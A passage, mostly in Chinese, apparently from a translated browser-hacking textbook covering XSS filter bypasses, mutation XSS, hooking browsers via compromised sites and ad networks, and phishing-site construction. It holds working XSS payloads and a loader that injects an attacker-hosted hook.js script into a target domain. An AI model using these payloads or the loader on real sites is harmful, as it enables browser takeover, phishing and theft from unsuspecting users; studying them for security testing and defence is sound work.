
```
<form>
 <INPUT name="content">
  <IMG src="" onerror="with(parentNode)
   submit(action=(method='post')+
   '.php',content.value='<form>'+
   innerHTML.slice(alert('XSS'),155))">
```

你可以清楚地看到，如何利用这个常见的 Web 应用缺陷来嵌入最初的恶意逻辑。虽然我们已经尽力总结 XSS 的各种形式，但要记住，像大多数 Web 安全领域的漏洞一样，这些仍在不断演进。

DOM XSS 和通用 XSS 是后期加入的 XSS 类别的完美例子。与此同时，随着 Internet、HTML 和浏览器功能的持续增强，我们有信心 XSS 将继续成为一种在奇怪而奇妙的方式中执行内容的有效手段。

### Bypassing XSS Controls

下面的章节将介绍如何绕过 XSS 控制。随后，在第 3 章的“规避检测”部分，你将进一步探索用于混淆恶意代码的技术。

大多数之前的 XSS 示例假设攻击者可以直接提交恶意 JavaScript 而不受限制。事实上，这并非总是如此。通常会有多种阻碍阻止你的攻击代码在目标浏览器中执行。

这些阻碍形式多样，包括注入上下文的限制、浏览器之间的语言差异、浏览器内置的安全控制，以及 Web 应用的防护措施。如果你发现自己需要费尽周折才能成功利用 XSS，别感到惊讶！

#### Bypassing Browser XSS Defenses

除了可能出现的 JavaScript 执行问题外，现代浏览器中的 XSS 控制也是你面临的另一重大客户端障碍。这些防护措施旨在降低恶意 XSS 负载在目标浏览器中执行的可能性。防护措施包括 Chrome 和 Safari 的 XSS 审计器、Internet Explorer 的 XSS 过滤器以及 Firefox 的 NoScript 扩展。

一种依赖浏览器优化对输入进行变异的 XSS 绕过技术被称为变异式跨站脚本（mXSS）。这种方法只有在浏览器对你精心构造的输入进行优化时才有效，即开发者使用 `innerHTML` 等方式解析你的输入。

关键点是：你的输入无论如何都会被优化。下面的代码示例演示了 mXSS 的工作原理：

```
// attacker input to innerHTML
<img src="test.jpg" alt="``onload=xss()" />

// browser output
<IMG alt=``onload=xss() src="test.jpg"> 
```

此示例突出了反引号（`）字符如何用于绕过 Internet Explorer 的 XSS 过滤器。浏览器的优化使得 `onload` 属性的值被执行。

#### Bypassing Server XSS Defenses

XSS 过滤并非仅限于客户端，事实上，服务器端的过滤自这些漏洞被发现以来一直是标准的应对措施。理想情况下，Web 应用的 XSS 防护既包括输入过滤也包括输出编码。

一个绕过示例出现在 Microsoft 的 `.NET` 框架中。它提供了多种开发者可用的方法来降低恶意负载被服务器解析的可能性，包括 `RequestValidator` 类。早期的这些方法并不完全有效。例如，提交以下任一负载即可绕过过滤：

```
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(6))>
<%tag style="xss:expression(alert(6))">
```

这两个示例都利用了 Microsoft 动态属性（Dynamic Properties）中的 `expression()` 功能。该功能用于在 CSS 中提供动态属性。

除了在源代码层面修复这些问题，安全供应商还快速提供了在脆弱应用之外的自动化修复方法，主要体现在 Web Application Firewall（WAF）或专门软件过滤器上，这些过滤器在应用层面执行相同的任务。无论技术组合如何，目标与客户端防护相同：降低攻击者利用 Web 安全漏洞的可能性。

该技术如此有效，以至于所有攻击者都回家，WAF 技术被视为解决所有 Web 漏洞的万能药。当然，圣诞老人也是真实的！实际上，当面对挑战时，黑客们会挺身而出。9 正如绕过客户端控制一样，类似的负载和手段也被用于服务器端控制。

WAF（及相关）技术常用的一种过滤技巧是检测出现上下文不符或可疑的括号。Gareth Heyes 2012 年的技术 10 是一个很好的绕过示例，它通过为 `window` DOM 对象附加错误处理器（不使用括号）并立即抛出异常来实现：

```
onerror=alert;throw 1;
onerror=eval;throw'=alert\x281\x29';
```

这两个示例中均不包含可疑的括号，但它们的注入点必须位于 HTML 元素的属性中。

* * *

**XSS Cheat Sheets** 是的，我们承认，如果你不是开发人员或 JavaScript 黑客，上面的示例可能让你感到困惑，双手抓起刚从头发上拔掉的头发！别担心。在许多情况下，期望攻击者或测试人员记住所有绕过 XSS 过滤的可能方法是不合理的。其中最早且最著名的 XSS 速查表是 Robert Hansen（RSnake）的 XSS Cheat Sheet，已捐赠给 OWASP 并可在 [`https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet`](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) 找到。随着 HTML5 的新特性不断引入，新的可利用的浏览器特性和属性也随之发现。Mario Heiderich 发布了 HTML5 安全速查表，可在 [`http://html5sec.org/`](http://html5sec.org/) 查看。除了这些速查表外，还有无数种组合方式可以将这些负载进行编码、组合和混合。帮助你完成这些操作的方法包括：

-   `[Burp Suite]`的解码功能

-   `[Gareth Hayes]`的 Hackvertor：[`hackvertor.co.uk/public`](https://hackvertor.co.uk/public)

-   `[Mario Heiderich]`的字符编码器：[`yehg.net/encoding/`](http://yehg.net/encoding/)

* * *

## 使用受损的 Web 应用程序

攻击者获取浏览器访问权限的常见方法是通过未经授权访问 Web 应用程序。获取访问权限后，攻击者可能会修改 Web 服务器返回的内容，以包含恶意逻辑。

Web 应用程序的利用可能涉及多种攻击，包括利用 SQL 注入或远程代码执行漏洞。另一种获取 Web 应用程序控制权的方法是直接未经授权访问管理服务，例如 FTP、SFTP 或 SSH。此类攻击超出了本书的范围。

一旦获得访问权限，攻击者可以向目标 Web 应用程序中插入任意内容。这些内容可能会在访问该 Web 应用程序的任何浏览器中执行。这使得在目标浏览器中插入指令以获取初始控制成为理想的位置。

控制拥有大量访客的合法 Web 应用程序将提供大量目标浏览器。目标浏览器越多，成功利用的可能性就越大。当然，你的能力受到参与范围的限制。

## 使用广告网络

在线广告网络在互联网上散布的各种网站上显示横幅广告。你可能从未停下来思考过广告实际包含什么内容。简而言之，最重要的一点是广告运行你提供的指令。现在，你感兴趣的使用案例就在这里了！

你可以使用广告网络让初始控制代码在许多浏览器中运行。你需要注册并完成所有他们的流程。完成后，只需支付小额费用，你就可以掌握众多浏览器。请记住，不会单独针对某个浏览器，因为初始代码的执行会在多个来源之间随机发生。

对于专业项目，很少会寻找随机的浏览器集合。你更可能希望针对来自单一或多个 IP 地址的浏览器请求。这可以通过配置像 BeEF（Browser Exploitation Framework）这样的框架来实现，后续章节会更深入地介绍。

也可能出现想要针对安全的源的情况，即除认证页面外使用广告提供商的安全方式。你可以注册该广告提供商，并使用以下代码让你的指令仅在目标源中执行。

``` 
if (document.location.host.indexOf("browservictim.com") >= 0)
{
        var scr = document.createElement('script')
        scr.setAttribute('src','https://browserhacker.com/hook.js');
        document.getElementsByTagName('body').item(0).appendChild(scr);
}
```

使用上述代码，你可以检查源，如果是正确的目标，则动态加载你的脚本。无需查看源代码，此脚本在其他域名上应保持不可见。Jeremiah Grossman 和 Matt Johansen 从 WhiteHat Security 于 2013 年 11 月在 BlackHat 上展示了类似的攻击。他们的研究涉及购买合法的广告，其中包含了他们控制的嵌入式 JavaScript。

## 使用社交工程攻击

社交工程是一系列旨在诱使个人执行操作或泄露信息的方法。安全链中的“人”环节一直被认为是最弱的环节。自社交互动伊始，攻击者就一直在利用这一点。

历史上，社交工程可能被视为欺诈或自信骗局的一种形式。如今，该术语与数字领域更直接相关，往往不依赖面对面与受害者的互动。

金融行业是这类攻击的显著受害者。欺诈者会设置数字诈骗，试图骗取在线银行凭证，然后转移被盗资金。常见的社交工程手段是结合垃圾邮件电子邮件和钓鱼网站。

* * *

**SPAM and Phishing** 在本书语境中，SPAM 和钓鱼有时会被混用。我们将 SPAM 定义为未经请求的电子邮件，通常以批量形式发送，广告真实（或有时是虚假）商品和服务。钓鱼是直接尝试获取信息（通常是用户名和密码），然后在暗网市场出售或直接用于欺诈受害者。钓鱼包含多个组成部分，包括假网站、假电子邮件和有时是假即时消息。钓鱼电子邮件通常使用与垃圾邮件相同的手段诱骗受害者访问其假网站。Spear phishing 是一种类似于常规钓鱼的技术，但攻击者会缩小目标范围，专注于较小的、特定的受害者群体。这使他们能够收集更多背景信息，并更有效地定制诱骗。请记住 2011 年的 RSA  breach 破坏事件？初始阶段是两次针对不同员工群体的独立 spear phishing 运动。电子邮件附件包含了针对 Microsoft Excel 的零日漏洞。你可以阅读更多内容，例如 [`http://blogs.rsa.com/anatomy-of-an-attack/`](http://blogs.rsa.com/anatomy-of-an-attack/) 或 [`http://www.theregister.co.uk/2011/03/18/rsa_breach_leaks_securid_data/`](http://www.theregister.co.uk/2011/03/18/rsa_breach_leaks_securid_data/)。

* * *

Leveraging phishing techniques to establish a beachhead on a target organization’s network works in much the same way as the scammers’ mode of operation. However, instead of trying to just acquire credentials or other information, you will attempt to inject your instructions into the target’s browser.

The following sections discuss a few common methods in detail. They demonstrate how to use these attacks with the ultimate aim of coercing a target’s browser into executing your payloads.

### Phishing Attacks

As we have discussed, phishing attacks are one method traditionally executed by fraudsters to acquire user credentials for online services. Example targets of phishing attacks include online banking portals, PayPal, eBay, and even tax services. Phishing attacks can take many forms, including:

* E-mail phishing—An e-mail is sent to multiple recipients, asking the victim to respond to the e-mail with information valuable to the attacker. This technique is also used to distribute malware in the form of malicious links or attachments. An example phishing e-mail is shown in `Figure 2-1`.

* Website phishing—A fake website is hosted online, impersonating a legitimate website. To trick users into visiting the site, the scammers employ supplementary techniques such as phishing e-mails, instant messages, SMS messages, or even voice calls.

* Spear phishing—Often employs a fraudulent website as well, but the lures are customized for a small, targeted audience.

* Whaling—A term coined for spear phishing that is targeting high profile or senior executives.

**Figure 2-1:** Phishing e-mail example12

![c02f001.tif](img/c02f001.png)

In the context of targeting browsers, your primary goal is to execute your code within the target browser. Therefore, pure e-mail phishing and other non-browser forms of social engineering won’t be discussed.

#### Phase 1: The Website

-   [构建假网站](https://wiki.example.org/feynmans_learning_method)是网络钓鱼攻击的第一阶段，其中包含恶意代码。根据网络钓鱼活动的范围，假网站可能是完全虚构的，也可能冒充合法网站。例如，如果你的目标是一家能源公司，你可能不想构建一个假的在线银行门户网站。相反，你可以创建一套符合能源行业兴趣的自定义网站，比如一个假的能源监管机构。

-   你可以选择构建单页，也可以构建多页网站。如果想降低目标用户发现网站“可疑”的可能性，建议提供比单页更多的内容。否则，单页通常足以在浏览器中执行初始 JavaScript 载荷。

-   一旦确定了假网站的内容，你可以使用以下几种方法构建所需的 HTML 及相关文件：

    * 从零开始构建网站——这对针对性钓鱼攻击可能有效，但耗时较长。

    * 复制并修改现有网站——与从零开始构建类似，但你可以利用互联网上已有的已发表内容。大多数现代浏览器都支持使用“保存页面”功能保存当前激活的网站。这可以加快内容构建速度。保存后，你可以直接在 HTML 中修改标题和表头字段。

    * 克隆现有网站——与复制并修改现有网站类似，但你不需要保存内容并进行修改，而是直接克隆整个网站。

    * 显示错误页面——通常只需显示一个错误页面即可。最终页面看起来像是服务器错误，但实际上浏览器内部执行你的指令。

-   如前文所述，XSS 方法有时不需要为钓鱼攻击创建全新网站。如果你在目标网络应用中进行了 Web 侦察，并发现了 XSS 漏洞，你可以利用该漏洞使其作为钓鱼站点。

-   这种方法的优势在于，目标用户不太可能对指向他们熟悉的 URL 产生怀疑。它还为钓鱼诱饵提供了借口。假设你发现了一个可以 URL 编码的 XSS 漏洞，你可以在钓鱼邮件中提交以下内容（仅在 Firefox 上有效）：

    “Hi IT Support,

    I’ve been browsing your website and I’ve noticed a weird error message when I perform a search. After I click the ‘Search’ button I end up on this page: 
